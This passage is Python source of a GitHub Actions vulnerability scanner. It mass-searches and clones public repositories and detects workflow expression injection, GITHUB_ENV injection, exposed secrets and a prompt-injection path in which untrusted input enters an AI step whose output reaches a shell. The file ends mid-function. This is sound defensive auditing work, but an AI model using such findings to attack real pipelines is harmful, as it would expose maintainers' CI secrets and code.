#!/usr/bin/env python3
"""
GHA Vulnerability Scanner v3.5 — Unified Pipeline
==================================================
Single script: Discovery → Enrichment → Analysis → Report.
Zero false negatives. Expression injection + GITHUB_ENV injection.

Author: Sergio Cabrera
        https://www.linkedin.com/in/sergio-cabrera-878766239/

License: MIT
Repository: https://github.com/sergio-cabrera/gha-vuln-scanner

v3.5: Git clone mode (--clone) for full repo context, per-job secrets
      scoping, boolean expression FP elimination, NO_CONTROL expansion,
      github-script exception to R7c_WITH, multi-job gate detection,
      cross-workflow analysis (workflow_run chains), local composite
      action scanning.

Usage:
  ghascan --query 6
  ghascan --all --min-stars 100
  ghascan --query 1 -v --verdict CRITICAL HIGH
  ghascan --offline scan_data.json -v --html report.html
"""

import os, sys, json, time, re, argparse, hashlib, functools
import urllib.request, urllib.parse, urllib.error, base64
from dataclasses import dataclass, field
from collections import Counter, defaultdict
from datetime import datetime

_original_print = print
print = functools.partial(_original_print, flush=True)

try:
    import yaml
    HAS_YAML = True
except ImportError:
    HAS_YAML = False

# ── Token management (from environment only — NEVER hardcoded) ─────
from gha_vuln_scanner.tokens import (
    next_token as _next_token,
    get_tokens,
    token_count,
    has_token as _has_token,
)

_TOKENS = get_tokens()
GITHUB_TOKEN = _TOKENS[0] if _TOKENS else None

import threading as _threading

# ════════════════════════════════════════════════════════════════════
#  ANSI COLORS
# ════════════════════════════════════════════════════════════════════

def _supports_color():
    if os.environ.get('NO_COLOR'): return False
    if os.environ.get('FORCE_COLOR'): return True
    if sys.platform == 'win32':
        try:
            import ctypes; k = ctypes.windll.kernel32
            k.SetConsoleMode(k.GetStdHandle(-11), 7); return True
        except: return hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()
    return hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()

_COLOR = _supports_color()

class C:
    RESET='\033[0m' if _COLOR else ''; BOLD='\033[1m' if _COLOR else ''
    DIM='\033[2m' if _COLOR else ''; RED='\033[91m' if _COLOR else ''
    GREEN='\033[92m' if _COLOR else ''; YELLOW='\033[93m' if _COLOR else ''
    BLUE='\033[94m' if _COLOR else ''; MAGENTA='\033[95m' if _COLOR else ''
    CYAN='\033[96m' if _COLOR else ''; WHITE='\033[97m' if _COLOR else ''
    DARK_RED='\033[38;5;124m' if _COLOR else ''
    RED_ORANGE='\033[38;5;202m' if _COLOR else ''
    ORANGE='\033[38;5;208m' if _COLOR else ''
    LIGHT_YELLOW='\033[38;5;220m' if _COLOR else ''
    VIOLET='\033[38;5;135m' if _COLOR else ''

SEV_COLOR = {'CRITICAL': f'{C.BOLD}{C.DARK_RED}', 'HIGH': f'{C.BOLD}{C.RED_ORANGE}',
             'MEDIUM': f'{C.ORANGE}', 'LOW': f'{C.LIGHT_YELLOW}',
             'AI_INJECTION': f'{C.BOLD}{C.VIOLET}',
             'FALSE_POSITIVE': C.DIM}

def sev(s): return f"{SEV_COLOR.get(s,'')}{s}{C.RESET}"
def dim(s): return f"{C.DIM}{s}{C.RESET}"
def url_c(s): return f"{C.BLUE}{C.BOLD}{s}{C.RESET}"

# ════════════════════════════════════════════════════════════════════
#  CONSTANTS (imported from constants module)
# ════════════════════════════════════════════════════════════════════

from gha_vuln_scanner.constants import (
    QUERIES, DANGEROUS_EXPRESSIONS, COMPILED_DANGEROUS,
    ENV_INJECT_PAT, FULL_CONTROL, PARENT_FULL_CONTROL,
    LIMITED_CONTROL, NO_CONTROL, NO_CONTROL_PREFIXES,
    EXPR_TRIGGERS, OPEN_TYPES, RESTRICTED_TYPES, INTERNAL_TRIGGERS,
    DISABLE_PATS, AUTH_PATS, OPENNESS_DESC, SKIP_EXTENSIONS,
    CONTROL_DESC, SIZE_RANGES, MAX_RESULTS, MIN_SPLIT_SIZE,
    ctrl_label, ctrl_explain,
)

# Backward compat aliases for internal references
_COMPILED_DANGEROUS = COMPILED_DANGEROUS
_ENV_INJECT_PAT = ENV_INJECT_PAT
_OPENNESS_DESC = OPENNESS_DESC


# ════════════════════════════════════════════════════════════════════
#  DATA CLASSES
# ════════════════════════════════════════════════════════════════════

@dataclass
class ExprVuln:
    line: int
    expression: str
    status: str = ''
    rule: str = ''
    reason: str = ''
    control_level: str = ''
    context: str = ''
    echo_only: bool = False
    in_heredoc: bool = False

@dataclass
class Finding:
    repo: str
    path: str
    stars: int = 0
    org_name: str = ''
    org_type: str = ''
    repo_url: str = ''
    file_url: str = ''
    security_url: str = ''
    workflow_content: str = ''
    severity: str = ''
    confidence: str = 'HIGH'
    triggers: dict = field(default_factory=dict)
    trigger_openness: str = ''
    who_can_trigger: str = ''
    explanation: str = ''
    secrets_exposed: list = field(default_factory=list)
    has_github_token: bool = True
    permissions: dict = field(default_factory=dict)
    has_auth_check: bool = False
    auth_details: str = ''
    attack_narrative: str = ''
    active_vulns: list = field(default_factory=list)
    eliminated_vulns: list = field(default_factory=list)
    env_injections: list = field(default_factory=list)
    unpinned_actions: list = field(default_factory=list)
    content_hash: str = ''
    query_id: int = -1
    query_name: str = ''
    merged_only: bool = False
    has_echo_only: bool = False
    indirect_vulns: list = field(default_factory=list)
    has_heredoc_only: bool = False
    permissions_readonly: bool = False
    poc: str = ''
    ai_risk: list = field(default_factory=list)
    vuln_job_name: str = ''
    vuln_job_secrets: list = field(default_factory=list)
    workflow_secrets: list = field(default_factory=list)
    secrets_scoped: bool = False


# ════════════════════════════════════════════════════════════════════
#  PHASE 1: DISCOVERY (GitHub API + Search)
# ════════════════════════════════════════════════════════════════════

def api_request(url, _retry=0, _max_retries=6):
    headers = {
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": "gha-vuln-scanner/3.5",
    }
    token = _next_token()
    if token:
        headers["Authorization"] = f"token {token}"

    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req)
        data = json.loads(resp.read().decode())
        remaining = resp.headers.get("X-RateLimit-Remaining", "?")
        reset_time = resp.headers.get("X-RateLimit-Reset", "0")
        resp.close()
        return data, int(remaining) if remaining != "?" else 999, int(reset_time)
    except urllib.error.HTTPError as e:
        body = ""
        try: body = e.read().decode()
        except: pass
        code = e.code
        reset_hdr = e.headers.get("X-RateLimit-Reset", "0") if e.headers else "0"
        try: e.close()
        except: pass
        is_rate_limit = (code == 403 and "rate limit" in body.lower()) or code == 429
        if is_rate_limit:
            if _retry >= _max_retries:
                print(f"  ❌ Rate limit: max retries ({_max_retries})"); return None, 0, 0
            try:
                reset_wait = max(int(reset_hdr) - int(time.time()), 0)
            except (ValueError, TypeError):
                reset_wait = 0
            base_wait = max(reset_wait, 30 * (2 ** _retry))
            wait = min(base_wait, 180)
            print(f"  ⏳ Rate limited (retry {_retry+1}/{_max_retries}). Waiting {wait}s...")
            time.sleep(wait + 1)
            return api_request(url, _retry + 1, _max_retries)
        elif code == 422:
            print(f"  ❌ Validation error: {body[:200]}"); return None, 0, 0
        elif code == 408:
            if _retry >= _max_retries:
                print(f"  ❌ Timeout: max retries"); return None, 0, 0
            wait = min(30 * (2 ** _retry), 120)
            print(f"  ⏳ Timeout (retry {_retry+1}/{_max_retries}). Waiting {wait}s...")
            time.sleep(wait)
            return api_request(url, _retry + 1, _max_retries)
        else:
            print(f"  ❌ HTTP {code}: {body[:200]}"); return None, 0, 0
    except Exception as e:
        print(f"  ❌ {type(e).__name__}: {e}"); return None, 0, 0


def search_code(query, page=1, per_page=100):
    params = urllib.parse.urlencode({"q": query, "per_page": per_page, "page": page})
    return api_request(f"https://api.github.com/search/code?{params}")


def get_total_count(query):
    data, rem, reset = search_code(query, page=1, per_page=1)
    if data is None:
        time.sleep(65)
        data, rem, reset = search_code(query, page=1, per_page=1)
    return (data.get("total_count", 0) if data else 0), rem, reset


def _size_qualifier(lo, hi):
    return f"size:>={lo}" if hi is None else f"size:{lo}..{hi}"


def _subdivide_range(base_q, lo, hi, depth=0, max_depth=8):
    sub_q = f"{base_q} {_size_qualifier(lo, hi)}"
    count, _, _ = get_total_count(sub_q)
    if count == 0: return []
    label = f"{lo}-{hi or '∞'}b ({count})"
    if count <= MAX_RESULTS: return [(sub_q, label)]
    if hi is None:
        hi_guess = max(lo * 2, lo + 10000)
        r = _subdivide_range(base_q, lo, hi_guess, depth+1, max_depth)
        r += _subdivide_range(base_q, hi_guess+1, None, depth+1, max_depth)
        return r
    span = hi - lo
    if span < MIN_SPLIT_SIZE or depth >= max_depth:
        return [(sub_q, label)]
    mid = lo + span // 2
    r = _subdivide_range(base_q, lo, mid, depth+1, max_depth)
    r += _subdivide_range(base_q, mid+1, hi, depth+1, max_depth)
    return r


def subdivide_query(base_q):
    total, _, _ = get_total_count(base_q)
    if total == 0: return []
    if total <= MAX_RESULTS: return [(base_q, f"all ({total})")]
    print(f"   ⚠️  {total} results, subdividing...")
    subs = []
    for lo, hi in SIZE_RANGES:
        subs.extend(_subdivide_range(base_q, lo, hi))
    return subs


def fetch_all_items(query_str, start_page=1, end_page=10, limit=0):
    items = []
    _page_sleep = max(2, 7 // token_count()) if token_count() > 0 else 7
    for page in range(start_page, end_page + 1):
        print(f"      📄 Page {page}...")
        data, remaining, reset = search_code(query_str, page=page)
        if not data: break
        batch = data.get("items", [])
        total = data.get("total_count", 0)
        if page == start_page:
            print(f"         ({total} total, max {min((total+99)//100, 10)} pages)")
        if not batch: break
        print(f"         {len(batch)} items (API remaining: {remaining})")
        items.extend(batch)
        if limit > 0 and len(items) >= limit:
            print(f"         {C.YELLOW}→ Reached limit ({limit}), stopping fetch{C.RESET}")
            break
        if remaining < 3:
            wait = max(reset - int(time.time()), 10)
            print(f"         ⏳ Rate wait {wait}s..."); time.sleep(wait + 1)
        else:
            time.sleep(_page_sleep)
    return items


def discover(query_ids, start_page=1, end_page=10, auto_subdivide=True, limit=0):
    all_items = []
    for qid in query_ids:
        name, q = QUERIES[qid]
        print(f"\n🔍 Q{qid}: {name}")
        if auto_subdivide and start_page == 1:
            subs = subdivide_query(q)
            for i, (sq, label) in enumerate(subs):
                print(f"  📂 [{i+1}/{len(subs)}] {label}")
                items = fetch_all_items(sq, limit=limit)
                all_items.extend((it, qid, name) for it in items)
                if limit > 0 and len(all_items) >= limit: break
        else:
            items = fetch_all_items(q, start_page, end_page, limit=limit)
            all_items.extend((it, qid, name) for it in items)
        if limit > 0 and len(all_items) >= limit: break
        time.sleep(3)

    seen = set()
    candidates = []
    for item, qid, qname in all_items:
        repo = item["repository"]["full_name"]
        path = item["path"]
        key = f"{repo}:{path}"
        if key in seen: continue
        if any(path.endswith(ext) for ext in SKIP_EXTENSIONS): continue
        seen.add(key)
        owner, repo_name = repo.split("/", 1)
        candidates.append({"repo": repo, "owner": owner, "repo_name": repo_name,
                           "path": path, "query_id": qid, "query_name": qname})
        if limit > 0 and len(candidates) >= limit: break

    print(f"\n📋 {len(candidates)} unique candidates from {len(query_ids)} queries")
    return candidates


# ════════════════════════════════════════════════════════════════════
#  PHASE 2: ENRICHMENT (repo metadata + content)
# ════════════════════════════════════════════════════════════════════

def get_repo_info(owner, repo_name):
    data, _, _ = api_request(f"https://api.github.com/repos/{owner}/{repo_name}")
    if not data:
        return None
    owner_data = data.get("owner", {})
    org_name = ""
    org_type = owner_data.get("type", "User")
    if org_type == "Organization":
        org_name = data.get("organization", {}).get("name", "") or owner_data.get("login", "")
    else:
        org_name = owner_data.get("login", "")
    return {
        "stars": data.get("stargazers_count", 0),
        "fork": data.get("fork", False),
        "archived": data.get("archived", False),
        "org_name": org_name,
        "org_type": org_type,
        "description": data.get("description", ""),
    }


def get_file_content(owner, repo_name, path):
    encoded = urllib.parse.quote(path)
    data, _, _ = api_request(f"https://api.github.com/repos/{owner}/{repo_name}/contents/{encoded}")
    if data and "content" in data:
        return base64.b64decode(data["content"]).decode("utf-8", errors="replace")
    return None


import subprocess as _subprocess, tempfile as _tempfile, shutil as _shutil
import stat as _stat


def _rmtree_safe(path):
    """shutil.rmtree that handles read-only .git files on Windows."""
    def _on_error(func, fpath, exc_info):
        try:
            os.chmod(fpath, _stat.S_IWRITE)
            func(fpath)
        except Exception:
            pass
    _shutil.rmtree(path, onerror=_on_error)

_CLONE_DIR = None
_clone_cache = {}
_clone_lock = _threading.Lock()


def git_clone_repo(owner, repo_name):
    repo_key = f"{owner}/{repo_name}"
    with _clone_lock:
        if repo_key in _clone_cache:
            return _clone_cache[repo_key]

    clone_dir = _CLONE_DIR or os.path.join(os.getcwd(), 'cloned_repos')
    dest = os.path.join(clone_dir, f"{owner}__{repo_name}")

    if os.path.exists(dest):
        with _clone_lock:
            _clone_cache[repo_key] = dest
        return dest

    url = f"https://github.com/{owner}/{repo_name}.git"
    token = _next_token()
    if token:
        url = f"https://x-access-token:{token}@github.com/{owner}/{repo_name}.git"

    try:
        result = _subprocess.run(
            ['git', 'clone', '--depth=1', '--filter=blob:none', '--sparse', url, dest],
            capture_output=True, text=True, timeout=60
        )
        if result.returncode != 0:
            print(f"  {C.YELLOW}⚠ Clone failed for {repo_key}: {result.stderr[:100]}{C.RESET}")
            with _clone_lock:
                _clone_cache[repo_key] = None
            return None

        _subprocess.run(
            ['git', 'sparse-checkout', 'set', '.github'],
            capture_output=True, text=True, timeout=30, cwd=dest
        )
        _subprocess.run(
            ['git', 'checkout'],
            capture_output=True, text=True, timeout=30, cwd=dest
        )

        with _clone_lock:
            _clone_cache[repo_key] = dest
        return dest
    except Exception as e:
        print(f"  {C.YELLOW}⚠ Clone error for {repo_key}: {e}{C.RESET}")
        with _clone_lock:
            _clone_cache[repo_key] = None
        return None


def get_file_content_from_clone(clone_path, file_path):
    full_path = os.path.join(clone_path, file_path)
    if os.path.isfile(full_path):
        try:
            with open(full_path, 'r', encoding='utf-8', errors='replace') as f:
                return f.read()
        except:
            return None
    return None


def get_all_workflow_files(clone_path):
    wf_dir = os.path.join(clone_path, '.github', 'workflows')
    if not os.path.isdir(wf_dir):
        return []
    files = []
    for f in os.listdir(wf_dir):
        if f.endswith(('.yml', '.yaml')) and not any(f.endswith(ext) for ext in SKIP_EXTENSIONS):
            files.append(os.path.join('.github', 'workflows', f))
    return files


_USE_CLONE = False


def _enrich_one(c, cache, cache_lock, min_stars):
    repo = c["repo"]
    with cache_lock:
        cached_info = cache.get(repo)
    if cached_info is None:
        info = get_repo_info(c["owner"], c["repo_name"])
        with cache_lock:
            cache[repo] = info
    else:
        info = cached_info
    if not info: return None, "api_fail"
    if info["fork"]: return None, "forks"
    if info["archived"]: return None, "archived"
    if info["stars"] < min_stars: return None, "low_stars"

    content = None
    clone_path = None
    other_workflows = {}

    if _USE_CLONE:
        clone_path = git_clone_repo(c["owner"], c["repo_name"])
        if clone_path:
            content = get_file_content_from_clone(clone_path, c["path"])
            for wf_path in get_all_workflow_files(clone_path):
                if wf_path != c["path"]:
                    wf_content = get_file_content_from_clone(clone_path, wf_path)
                    if wf_content:
                        other_workflows[wf_path] = wf_content

    if not content:
        content = get_file_content(c["owner"], c["repo_name"], c["path"])

    if not content: return None, "no_content"

    f = Finding(
        repo=repo, path=c["path"], stars=info["stars"],
        org_name=info["org_name"], org_type=info["org_type"],
        repo_url=f"https://github.com/{repo}",
        file_url=f"https://github.com/{repo}/blob/HEAD/{c['path']}",
        security_url=f"https://github.com/{repo}/security",
        workflow_content=content,
        content_hash=hashlib.sha256(content.encode()).hexdigest()[:16],
        query_id=c.get('query_id', -1),
        query_name=c.get('query_name', ''),
    )
    f._other_workflows = other_workflows
    f._clone_path = clone_path
    return f, "ok"


def enrich(candidates, min_stars=0):
    import concurrent.futures, threading
    enriched = []
    cache = {}
    cache_lock = threading.Lock()
    stats = Counter()
    total = len(candidates)
    workers = max(token_count(), 1)

    print(f"   Checking stars + fetching workflows... ({workers} parallel workers)\n")

    done_count = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(_enrich_one, c, cache, cache_lock, min_stars): i
                   for i, c in enumerate(candidates)}
        for future in concurrent.futures.as_completed(futures):
            done_count += 1
            if done_count % 10 == 0 or done_count == 1:
                print(f"   📊 {done_count}/{total} checked | {len(enriched)} findings so far")
            try:
                result, reason = future.result()
                if result:
                    enriched.append(result)
                elif reason != "ok":
                    stats[reason] += 1
            except Exception as e:
                stats["error"] += 1

    print(f"\n   📊 Enrichment done: {len(enriched)} viable | "
          f"skipped: {stats['low_stars']} low_stars, {stats['forks']} forks, "
          f"{stats['archived']} archived")
    return enriched


# ════════════════════════════════════════════════════════════════════
#  PHASE 3: ANALYSIS
# ════════════════════════════════════════════════════════════════════

def parse_triggers(content):
    triggers = {}
    if HAS_YAML:
        try:
            p = yaml.safe_load(content)
            if p and isinstance(p, dict):
                on = p.get(True) or p.get('on') or {}
                if isinstance(on, str): triggers[on] = []
                elif isinstance(on, list):
                    for t in on: triggers[str(t)] = []
                elif isinstance(on, dict):
                    for k, v in on.items():
                        k = str(k)
                        if v is None: triggers[k] = []
                        elif isinstance(v, dict):
                            ts = v.get('types', [])
                            triggers[k] = [str(t) for t in ts] if isinstance(ts, list) else []
                        else: triggers[k] = []
        except: pass
    if not triggers:
        in_on = False; on_indent = -1
        for line in content.split('\n'):
            s = line.strip()
            if not s or s.startswith('#'): continue
            ind = len(line) - len(line.lstrip())
            if re.match(r'^on\s*:', s) or s == 'on:':
                in_on = True; on_indent = ind
                after = s.split(':', 1)[1].strip()
                if after:
                    for t in re.findall(r'[a-z_]+', after): triggers[t] = []
                continue
            if in_on:
                if ind <= on_indent and s: in_on = False; continue
                m = re.match(r'(\w+)\s*:', s)
                if m and ind == on_indent + 2: triggers[m.group(1)] = []
    return triggers


def parse_secrets(content):
    raw = set()
    for line in content.split('\n'):
        stripped = line.strip()
        if stripped.startswith('#'): continue
        for m in re.finditer(r'secrets\.([A-Za-z_][A-Za-z0-9_]*)', line):
            raw.add(m.group(1))
    custom = sorted(s for s in raw if s != 'GITHUB_TOKEN')
    has_token = 'GITHUB_TOKEN' in raw
    return custom, has_token


def parse_job_boundaries(lines):
    jobs = {}
    jobs_line = -1; jobs_indent = -1
    for i, line in enumerate(lines):
        s = line.strip()
        if s == 'jobs:' or s.startswith('jobs:'):
            jobs_line = i; jobs_indent = len(line) - len(line.lstrip()); break
    if jobs_line < 0:
        return jobs
    jki = jobs_indent + 2
    cur_name = None; cur_start = -1
    for i in range(jobs_line + 1, len(lines)):
        s = lines[i].strip(); ind = len(lines[i]) - len(lines[i].lstrip())
        if not s or s.startswith('#'): continue
        if ind == jki and s.endswith(':') and not s.startswith('-'):
            if cur_name is not None:
                jobs[cur_name] = (cur_start, i)
            cur_name = s.rstrip(':').strip()
            cur_start = i
        elif ind < jki and i > jobs_line + 1 and s:
            break
    if cur_name is not None:
        jobs[cur_name] = (cur_start, len(lines))
    return jobs


def parse_secrets_for_job(lines, job_start, job_end):
    raw = set()
    for i in range(job_start, min(job_end, len(lines))):
        stripped = lines[i].strip()
        if stripped.startswith('#'): continue
        for m in re.finditer(r'secrets\.([A-Za-z_][A-Za-z0-9_]*)', lines[i]):
            raw.add(m.group(1))
    custom = sorted(s for s in raw if s != 'GITHUB_TOKEN')
    return custom


def parse_job_needs(lines, job_start, job_end):
    needs = []
    for i in range(job_start, min(job_start + 30, job_end, len(lines))):
        s = lines[i].strip()
        if s.startswith('needs:'):
            rest = s[6:].strip()
            if rest.startswith('['):
                inner = rest.strip('[] ')
                needs = [n.strip().strip("'\"") for n in inner.split(',') if n.strip()]
            elif rest:
                needs = [rest.strip("'\"")]
            break
    return needs


def parse_job_if(lines, job_start, job_end):
    for i in range(job_start + 1, min(job_start + 15, job_end, len(lines))):
        s = lines[i].strip()
        if s.startswith('if:'):
            return s[3:].strip()
        if s.startswith('runs-on:') or s.startswith('steps:'):
            break
    return ''


def check_job_gated_by_needs(lines, vuln_job_name, all_job_boundaries):
    vuln_bounds = all_job_boundaries.get(vuln_job_name)
    if not vuln_bounds:
        return {}
    downstream_info = {}
    for jname, (js, je) in all_job_boundaries.items():
        if jname == vuln_job_name:
            continue
        needs = parse_job_needs(lines, js, je)
        j_if = parse_job_if(lines, js, je)
        j_secrets = parse_secrets_for_job(lines, js, je)
        if vuln_job_name in needs:
            gated = bool(j_if and f'needs.{vuln_job_name}' in j_if)
            downstream_info[jname] = {
                'needs': needs, 'if': j_if, 'secrets': j_secrets,
                'gated': gated
            }
    return downstream_info


def parse_permissions(content):
    perms = {}
    found_empty = False
    if HAS_YAML:
        try:
            p = yaml.safe_load(content)
            if p and isinstance(p, dict):
                wp = p.get('permissions')
                if wp is None:
                    pass
                elif isinstance(wp, str):
                    perms['_workflow'] = wp
                elif isinstance(wp, dict):
                    if wp:
                        perms.update(wp)
                    else:
                        found_empty = True
        except: pass
    if not perms and not found_empty:
        m = re.search(r'^permissions:\s*(.*)$', content, re.M)
        if m:
            val = m.group(1).strip()
            if val and val != '{}':
                perms['_workflow'] = val
    return perms


def find_unpinned_actions(content):
    unpinned = []
    for line in content.split('\n'):
        if line.strip().startswith('#'): continue
        m = re.search(r'uses:\s*([^@\s]+)@([^\s#]+)', line)
        if not m: continue
        action, ref = m.group(1), m.group(2)
        if action.startswith('./'): continue
        if action.startswith('actions/'): continue
        if re.match(r'^[a-f0-9]{40,}$', ref): continue
        unpinned.append(f"{action}@{ref}")
    return sorted(set(unpinned))


def find_env_injections(content, lines):
    injections = []
    for idx, line in enumerate(lines):
        if line.strip().startswith('#'): continue
        if not _ENV_INJECT_PAT.search(line): continue
        for pat in _COMPILED_DANGEROUS:
            m = pat.search(line)
            if m:
                injections.append({
                    "line": idx + 1, "expression": m.group(0),
                    "content": line.strip(),
                    "type": "GITHUB_PATH" if "GITHUB_PATH" in line else "GITHUB_ENV",
                })
                break
    return injections


def check_merged_only(content, triggers):
    if 'pull_request_target' not in triggers: return False
    for line in content.split('\n'):
        if line.strip().startswith('#'): continue
        if re.search(r'if:.*github\.event\.pull_request\.merged\s*(==\s*true|&&|\s*\}\})', line, re.I):
            return True
    return False


def check_echo_only(lines, vidx):
    if 0 <= vidx < len(lines):
        line = lines[vidx].strip()
        if re.match(r'^echo\s', line) or re.match(r'^printf\s', line):
            if '>' in line or '`' in line or '$(' in line or '|' in line:
                return False
            if "'" in line or '"' in line:
                return False
            return True
    return False


def check_heredoc_quoted(lines, vidx, expression=''):
    if 'toJSON(' not in expression:
        return False
    for i in range(vidx, max(-1, vidx - 30), -1):
        line = lines[i].strip()
        m = re.search(r"<<-?\s*['\"](\w+)['\"]", line)
        if m:
            delim = m.group(1)
            for j in range(vidx + 1, min(len(lines), vidx + 50)):
                if lines[j].strip() == delim:
                    return True
            return True
        m = re.search(r"<<-?\s*\\(\w+)", line)
        if m: return True
        if (line.startswith('- name:') or line.startswith('- run:') or
            line.startswith('- uses:')) and i < vidx:
            break
    return False


def check_permissions_readonly(content):
    if HAS_YAML:
        try:
            p = yaml.safe_load(content)
            if p and isinstance(p, dict):
                if 'permissions' not in p:
                    jobs = p.get('jobs', {})
                    if isinstance(jobs, dict):
                        if not jobs: return False
                        for jname, jdata in jobs.items():
                            if not isinstance(jdata, dict): return False
                            jp = jdata.get('permissions')
                            if jp is None: return False
                            if jp == {}: continue
                            if isinstance(jp, str) and jp in ('read-all',): continue
                            if isinstance(jp, dict):
                                if not all(v in ('read', 'none') for v in jp.values()): return False
                            else: return False
                        return True
                    return False
                wp = p['permissions']
                if wp == {}: return True
                if isinstance(wp, str) and wp in ('read-all',): return True
                if isinstance(wp, dict):
                    return all(v in ('read', 'none') for v in wp.values())
        except: pass
    if re.search(r'^\s*permissions:\s*\{\s*\}\s*$', content, re.M): return True
    return False


def find_indirect_injections(content, lines):
    indirects = []
    setter_ids = set()
    for idx, line in enumerate(lines):
        s = line.strip()
        if s.startswith('#'): continue
        if 'GITHUB_OUTPUT' in s:
            for pat in _COMPILED_DANGEROUS:
                if pat.search(s):
                    for i in range(idx, max(-1, idx - 20), -1):
                        ls = lines[i].strip()
                        if ls.startswith('#'): continue
                        m2 = re.match(r'-?\s*id:\s*(\S+)', ls)
                        if m2: setter_ids.add(m2.group(1)); break
                    break
    if setter_ids:
        for sid in setter_ids:
            pat = re.compile(r'\$\{\{\s*steps\.' + re.escape(sid) + r'\.outputs\.\w+')
            for idx, line in enumerate(lines):
                if line.strip().startswith('#'): continue
                m = pat.search(line)
                if m:
                    ctx = _get_line_context_fallback(lines, idx)
                    if ctx in ('run', 'script'):
                        indirects.append({"line": idx + 1, "expression": m.group(0),
                            "setter_step": sid, "context": ctx})
    return indirects


# ── AI prompt injection detection ──

_AI_ACTIONS = {
    'actions/ai-inference',
    'github/ai-inference',
}
_AI_ACTION_PATTERNS = [
    re.compile(r'ai-inference', re.I),
    re.compile(r'openai', re.I),
    re.compile(r'anthropic', re.I),
    re.compile(r'llm', re.I),
    re.compile(r'gpt[-_]', re.I),
    re.compile(r'copilot', re.I),
    re.compile(r'gemini', re.I),
]

def find_ai_risks(content, lines, ctx_map=None):
    if ctx_map is None: ctx_map = _build_context_map(content)
    risks = []
    ai_steps = {}
    current_step_id = None
    current_uses = None
    current_with_lines = []
    in_with = False

    for idx, line in enumerate(lines):
        stripped = line.strip()
        if stripped.startswith('#'): continue
        id_m = re.match(r'\s*-?\s*id:\s*(\S+)', stripped)
        if id_m:
            current_step_id = id_m.group(1)
        uses_m = re.match(r'\s*-?\s*uses:\s*(\S+)', stripped)
        if uses_m:
            action = uses_m.group(1).split('@')[0]
            is_ai = action in _AI_ACTIONS or any(p.search(action) for p in _AI_ACTION_PATTERNS)
            if is_ai:
                current_uses = action
        if re.match(r'\s+with:\s*$', line):
            in_with = True; current_with_lines = []; continue
        if in_with:
            indent = len(line) - len(line.lstrip())
            if stripped and indent <= 8 and not stripped.startswith(('prompt', 'input', 'message', 'content', 'text', 'body')):
                if current_uses and current_step_id:
                    tainted = []
                    for wl in current_with_lines:
                        for fc in FULL_CONTROL:
                            if fc in wl:
                                tainted.append(fc); break
                    if tainted:
                        ai_steps[current_step_id] = {
                            'line': idx, 'action': current_uses,
                            'tainted_fields': tainted
                        }
                in_with = False; current_uses = None; current_step_id = None
            else:
                current_with_lines.append(stripped)
        if stripped.startswith('- name:') or stripped.startswith('- uses:') or stripped.startswith('- run:'):
            if stripped.startswith('- ') and not uses_m:
                if current_uses and current_step_id and in_with:
                    tainted = []
                    for wl in current_with_lines:
                        for fc in FULL_CONTROL:
                            if fc in wl:
                                tainted.append(fc); break
                    if tainted:
                        ai_steps[current_step_id] = {
                            'line': idx, 'action': current_uses,
                            'tainted_fields': tainted
                        }
                in_with = False
                if not uses_m:
                    current_uses = None; current_step_id = None

    if current_uses and current_step_id and in_with:
        tainted = []
        for wl in current_with_lines:
            for fc in FULL_CONTROL:
                if fc in wl:
                    tainted.append(fc); break
        if tainted:
            ai_steps[current_step_id] = {
                'line': len(lines), 'action': current_uses,
                'tainted_fields': tainted
            }

    if not ai_steps: return risks

    for step_id, info in ai_steps.items():
        pat = re.compile(r'\$\{\{\s*steps\.' + re.escape(step_id) + r'\.outputs\.(\S+?)\s*\}\}')
        for idx, line in enumerate(lines):
            if line.strip().startswith('#'): continue
            ctx = ctx_map.get(idx)
            if ctx not in ('run', 'script'): continue
            m = pat.search(line)
            if m:
                risks.append({
                    'line': idx + 1,
                    'expression': m.group(0),
                    'ai_step': step_id,
                    'ai_action': info['action'],
                    'tainted_fields': info['tainted_fields'],
                    'output_name': m.group(1),
                    'context': ctx,
                })
    return risks


def _build_context_map(content):
    ctx_map = {}
    lines = content.split('\n')
    in_block = False; block_type = ''; block_indent = 0

    for idx, line in enumerate(lines):
        stripped = line.strip()
        if not stripped or stripped.startswith('#'):
            ctx_map[idx] = block_type if in_block else None; continue

        current_indent = len(line) - len(line.lstrip())
        if in_block and current_indent <= block_indent and stripped:
            in_block = False; block_type = ''

        run_m = re.match(r'^(\s*)(?:- )?run:\s*(.*)', line)
        if run_m:
            indent = len(run_m.group(1)); rest = run_m.group(2).strip()
            if rest in ('|', '|+', '|-', '>'):
                in_block = True; block_indent = indent; block_type = 'run'
                ctx_map[idx] = 'run_header'; continue
            elif rest:
                ctx_map[idx] = 'run'; continue
            else:
                ctx_map[idx] = None; continue

        script_m = re.match(r'^(\s*)script:\s*(.*)', line)
        if script_m:
            indent = len(script_m.group(1)); rest = script_m.group(2).strip()
            if rest in ('|', '|+', '|-', '>', ''):
                in_block = True; block_indent = indent; block_type = 'script'
                ctx_map[idx] = 'script_header'; continue
            elif rest:
                ctx_map[idx] = 'script'; continue

        if in_block: ctx_map[idx] = block_type; continue

        if stripped.startswith('name:'): ctx_map[idx] = 'name'
        elif stripped.startswith('if:'): ctx_map[idx] = 'if'
        elif stripped == 'env:' or re.match(r'env:\s*$', stripped):
            in_block = True; block_indent = current_indent; block_type = 'env'
            ctx_map[idx] = 'env'
        elif stripped == 'with:' or re.match(r'with:\s*$', stripped):
            in_block = True; block_indent = current_indent; block_type = 'with'
            ctx_map[idx] = 'with'
        else:
            ctx_map[idx] = None
    return ctx_map


def _get_line_context_fallback(lines, vidx):
    for i in range(vidx, max(-1, vidx - 30), -1):
        s = lines[i].strip()
        if not s or s.startswith('#'): continue
        if re.match(r'run:\s*[\|>]', s): return 'run'
        if re.match(r'run:\s', s) and i == vidx: return 'run'
        if s == 'env:' or re.match(r'env:\s*$', s): return 'env'
        if s == 'with:' or re.match(r'with:\s*$', s): return 'with'
        if re.match(r'script:\s*[\|>]', s) or s == 'script:': return 'script'
        if s.startswith('script:') and i < vidx: return 'script'
        if (s.startswith('- name:') or s.startswith('- uses:')) and i < vidx: return 'run'
    return 'unknown'


def find_job_for_line(lines, vidx):
    jobs_line = -1; jobs_indent = -1
    for i, line in enumerate(lines):
        s = line.strip()
        if s == 'jobs:' or s.startswith('jobs:'):
            jobs_line = i; jobs_indent = len(line) - len(line.lstrip()); break
    if jobs_line < 0: return -1, ''
